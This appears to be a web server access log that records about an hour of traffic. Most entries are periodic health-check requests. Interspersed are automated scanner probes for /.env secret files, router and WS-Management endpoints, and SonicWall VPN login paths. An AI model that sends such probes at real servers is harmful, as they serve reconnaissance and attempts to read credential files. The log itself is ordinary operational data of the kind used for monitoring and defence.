159.203.109.206 - - [19/Dec/2023:07:11:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8671 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:07:11:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8672 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:07:12:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8673 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:07:12:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8674 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:07:13:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8675 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:13:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8676 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:07:14:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8677 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:14:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8678 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:07:15:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8679 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:15:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8680 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:07:16:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8681 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:16:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8682 "www@docker" "http://172.18.0.9:80" 0ms
149.50.96.45 - - [19/Dec/2023:07:17:01 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 8683 "web-to-websecure@internal" "-" 0ms
149.50.96.45 - - [19/Dec/2023:07:17:01 +0000] "POST /HNAP1/ HTTP/1.1" 308 18 "-" "-" 8684 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:07:17:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8685 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:17:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8686 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:07:18:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8687 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:18:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8688 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:07:19:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8689 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:07:19:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8690 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:07:20:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8691 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:20:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8692 "www@docker" "http://172.18.0.9:80" 0ms
147.182.221.10 - - [19/Dec/2023:07:20:42 +0000] "GET /selfie HTTP/1.1" 404 19 "-" "-" 8693 "-" "-" 0ms
143.110.222.166 - - [19/Dec/2023:07:20:44 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 8694 "web-to-websecure@internal" "-" 0ms
34.67.136.168 - - [19/Dec/2023:07:20:48 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 8695 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:07:21:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8696 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:21:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8697 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:07:22:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8698 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:22:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8699 "www@docker" "http://172.18.0.9:80" 0ms
78.153.140.219 - - [19/Dec/2023:07:22:58 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 8700 "-" "-" 0ms
78.153.140.219 - - [19/Dec/2023:07:22:58 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 8701 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:07:23:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8702 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:23:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8703 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:07:24:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8704 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:24:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8705 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [19/Dec/2023:07:24:46 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 8706 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:07:25:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8707 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:25:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8708 "www@docker" "http://172.18.0.9:80" 0ms
35.203.211.199 - - [19/Dec/2023:07:26:02 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 8709 "web-to-websecure@internal" "-" 0ms
35.203.211.199 - - [19/Dec/2023:07:26:02 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 8710 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:07:26:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8711 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:07:26:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8712 "www@docker" "http://172.18.0.9:80" 1ms
57.129.23.166 - - [19/Dec/2023:07:26:46 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 8713 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [19/Dec/2023:07:26:46 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 8714 "web-to-websecure@internal" "-" 0ms
162.216.149.55 - - [19/Dec/2023:07:27:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 8715 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:07:27:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8716 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:07:27:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8717 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:07:28:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8718 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:07:28:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8719 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:07:29:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8720 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:29:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8721 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:07:30:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8722 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:30:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8723 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:07:31:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8724 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:31:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8725 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:07:32:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8726 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:32:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8727 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:07:33:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8728 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:33:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8729 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:07:34:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8730 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:34:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8731 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:07:35:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8732 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:35:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8733 "www@docker" "http://172.18.0.9:80" 0ms
198.235.24.47 - - [19/Dec/2023:07:35:48 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 8734 "dashboard@internal" "-" 0ms
198.235.24.47 - - [19/Dec/2023:07:35:48 +0000] "GET /dashboard/ HTTP/1.1" 200 3124 "-" "-" 8735 "dashboard@internal" "-" 5ms
159.203.109.206 - - [19/Dec/2023:07:36:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8736 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:36:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8737 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:07:37:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8738 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:37:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8739 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:07:38:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8740 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:38:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8741 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:07:39:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8742 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:39:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8743 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:07:40:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8744 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:07:40:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8745 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:07:41:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8746 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:41:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8747 "www@docker" "http://172.18.0.9:80" 0ms
172.104.208.245 - - [19/Dec/2023:07:42:03 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 8748 "web-to-websecure@internal" "-" 0ms
172.104.208.245 - - [19/Dec/2023:07:42:03 +0000] "GET / HTTP/2.0" 404 19 "-" "-" 8749 "-" "-" 0ms
173.255.235.132 - - [19/Dec/2023:07:42:11 +0000] "POST /wsman HTTP/1.1" 308 18 "-" "-" 8750 "web-to-websecure@internal" "-" 0ms
173.255.235.132 - - [19/Dec/2023:07:42:11 +0000] "POST /wsman HTTP/2.0" 404 19 "-" "-" 8751 "-" "-" 0ms
173.230.149.146 - - [19/Dec/2023:07:42:18 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 8752 "web-to-websecure@internal" "-" 0ms
173.230.149.146 - - [19/Dec/2023:07:42:18 +0000] "GET /auth.html HTTP/1.1" 301 17 "-" "-" 8753 "web-to-websecure@internal" "-" 0ms
173.230.149.146 - - [19/Dec/2023:07:42:18 +0000] "GET /sslvpnLogin.html HTTP/1.1" 301 17 "-" "-" 8754 "web-to-websecure@internal" "-" 0ms
173.230.149.146 - - [19/Dec/2023:07:42:18 +0000] "GET /auth1.html HTTP/1.1" 301 17 "-" "-" 8755 "web-to-websecure@internal" "-" 0ms
173.230.149.146 - - [19/Dec/2023:07:42:18 +0000] "GET /api/sonicos/auth HTTP/1.1" 301 17 "-" "-" 8756 "web-to-websecure@internal" "-" 0ms
173.230.149.146 - - [19/Dec/2023:07:42:18 +0000] "GET /api/sonicos/tfa HTTP/1.1" 301 17 "-" "-" 8757 "web-to-websecure@internal" "-" 0ms
173.230.149.146 - - [19/Dec/2023:07:42:19 +0000] "GET / HTTP/2.0" 404 19 "-" "-" 8758 "-" "-" 0ms
173.230.149.146 - - [19/Dec/2023:07:42:19 +0000] "GET /auth.html HTTP/2.0" 404 19 "-" "-" 8759 "-" "-" 0ms
173.230.149.146 - - [19/Dec/2023:07:42:19 +0000] "GET /auth1.html HTTP/2.0" 404 19 "-" "-" 8760 "-" "-" 0ms
173.230.149.146 - - [19/Dec/2023:07:42:19 +0000] "GET /sslvpnLogin.html HTTP/2.0" 404 19 "-" "-" 8761 "-" "-" 0ms
173.230.149.146 - - [19/Dec/2023:07:42:19 +0000] "GET /api/sonicos/tfa HTTP/2.0" 404 19 "-" "-" 8762 "-" "-" 0ms
173.230.149.146 - - [19/Dec/2023:07:42:19 +0000] "GET /api/sonicos/auth HTTP/2.0" 404 19 "-" "-" 8763 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:07:42:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8764 "www@docker" "http://172.18.0.9:80" 0ms
139.177.202.57 - - [19/Dec/2023:07:42:28 +0000] "HEAD / HTTP/1.1" 308 18 "-" "-" 8765 "web-to-websecure@internal" "-" 0ms
139.177.202.57 - - [19/Dec/2023:07:42:28 +0000] "HEAD / HTTP/1.1" 404 19 "-" "-" 8766 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:07:42:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8767 "www@docker" "http://172.18.0.9:80" 1ms
139.177.202.57 - - [19/Dec/2023:07:42:49 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 8768 "web-to-websecure@internal" "-" 0ms
139.177.202.57 - - [19/Dec/2023:07:42:50 +0000] "GET / HTTP/2.0" 404 19 "-" "-" 8769 "-" "-" 0ms
57.129.23.166 - - [19/Dec/2023:07:43:01 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 8770 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [19/Dec/2023:07:43:01 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 8771 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:07:43:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8772 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:43:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8773 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:07:44:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8774 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:44:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8775 "www@docker" "http://172.18.0.9:80" 0ms
139.177.202.57 - - [19/Dec/2023:07:44:46 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 8776 "web-to-websecure@internal" "-" 0ms
139.177.202.57 - - [19/Dec/2023:07:44:47 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 8777 "-" "-" 0ms
139.177.202.57 - - [19/Dec/2023:07:44:47 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 8778 "web-to-websecure@internal" "-" 0ms
139.177.202.57 - - [19/Dec/2023:07:44:47 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 8779 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:07:45:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8780 "www@docker" "http://172.18.0.9:80" 0ms
50.116.52.154 - - [19/Dec/2023:07:45:25 +0000] "GET / HTTP/1.0" 404 19 "-" "-" 8781 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:07:45:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8782 "www@docker" "http://172.18.0.9:80" 0ms
139.144.16.24 - - [19/Dec/2023:07:45:48 +0000] "GET / HTTP/1.0" 404 19 "-" "-" 8783 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:07:46:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8784 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:46:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8785 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:07:47:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8786 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:47:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8787 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:07:48:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8788 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:48:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8789 "www@docker" "http://172.18.0.9:80" 0ms
185.180.140.4 - - [19/Dec/2023:07:49:01 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 8790 "web-to-websecure@internal" "-" 0ms
185.180.140.4 - - [19/Dec/2023:07:49:01 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 8791 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:07:49:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8792 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:49:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8793 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:07:50:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8794 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:50:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8795 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:07:51:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8796 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:51:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8797 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:07:52:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8798 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:07:52:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8799 "www@docker" "http://172.18.0.9:80" 1ms
54.37.79.75 - - [19/Dec/2023:07:52:51 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 8800 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [19/Dec/2023:07:52:51 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 8801 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:07:53:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8802 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:53:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8803 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:07:54:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8804 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:54:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8805 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:07:55:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8806 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:55:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8807 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:07:56:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8808 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:07:56:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8809 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:07:57:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8810 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:57:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8811 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:07:58:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8812 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:58:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8813 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:07:59:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8814 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:59:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8815 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:08:00:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8816 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:00:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8817 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:08:01:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8818 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:01:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8819 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:08:02:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8820 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:02:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8821 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:08:03:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8822 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:03:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8823 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:08:04:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8824 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:04:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8825 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:08:05:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8826 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:05:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8827 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:08:06:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8828 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:06:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8829 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:08:07:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8830 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:07:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8831 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:08:08:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8832 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:08:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8833 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:08:09:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8834 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:09:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8835 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:08:10:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8836 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:10:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8837 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:08:11:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8838 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:11:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8839 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:08:12:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8840 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:12:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8841 "www@docker" "http://172.18.0.9:80" 0ms
198.235.24.249 - - [19/Dec/2023:08:12:43 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 8842 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:08:13:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8843 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:13:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8844 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:08:14:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8845 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:14:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8846 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:08:15:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8847 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:08:15:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8848 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:08:16:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8849 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:16:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8850 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:08:17:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8851 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [19/Dec/2023:08:17:34 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 8852 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [19/Dec/2023:08:17:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8853 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:08:18:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8854 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:18:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8855 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:08:19:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8856 "www@docker" "http://172.18.0.9:80" 0ms
